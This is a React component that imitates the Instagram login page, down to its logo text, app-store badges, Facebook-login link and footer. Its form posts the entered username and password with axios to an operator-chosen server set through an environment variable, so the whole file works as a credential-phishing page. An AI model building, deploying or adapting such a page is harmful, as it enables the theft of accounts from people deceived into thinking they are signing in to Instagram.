import React, { useState } from "react";
import axios from "axios";
import "./App.css";

const App = () => {
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await axios.post(
        import.meta.env.VITE_APP_HOST,
        formData
      );

      if (response.status === 200) {
        console.log("User data submitted successfully");

        // Reset form data after successful submission
        setFormData({
          username: "",
          password: "",
        });
      } else {
        console.error("Failed to submit user data");
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };

  return (
    <React.Fragment>
      <div id="wrapper">
        <div className="container">
          <div className="phone-app-demo" />
          <div className="form-data">
            <form onSubmit={handleSubmit}>
              <div className="logo">
                <h1>Instagram</h1>
              </div>
              <input
                type="text"
                name="username"
                value={formData.username}
                onChange={handleChange}
                placeholder="Phone number, username, or email"
              />
              <input
                type="password"
                name="password"
                value={formData.password}
                onChange={handleChange}
                placeholder="Password"
              />
              <button className="form-btn" type="submit">
                Submit
              </button>
              <span className="has-separator">Or</span>
              <a href="#" className="facebook-login">
                <i className="fab fa-facebook" /> Log in with Facebook
              </a>
              <a className="password-reset" href="#">
                Forgot password?
              </a>
            </form>
            <div className="sign-up">
              Don't have an account? <a href="#">Sign up</a>
            </div>
            <div className="get-the-app">
              <span>Get the app</span>
              <div className="badge">
                <img
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                  alt="android App"
                />
                <img
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                  alt="ios app"
                />
              </div>
            </div>
          </div>
        </div>

        <footer>
          <div className="container">
            <nav className="footer-nav">
              <ul>
                <li>
                  <a href="#">About Us</a>
                </li>
                <li>
                  <a href="#">Support</a>
                </li>
                <li>
                  <a href="#">Jobs</a>
                </li>
                <li>
                  <a href="#">Privacy</a>
                </li>
                <li>
                  <a href="#">Terms</a>
                </li>
                <li>
                  <a href="#">Profiles</a>
                </li>
                <li>
                  <a href="#">Languages</a>
                </li>
              </ul>
            </nav>
            <div className="copyright-notice">&copy; 2019 Complaints</div>
          </div>
        </footer>
      </div>
    </React.Fragment>
  );
};

export default App;
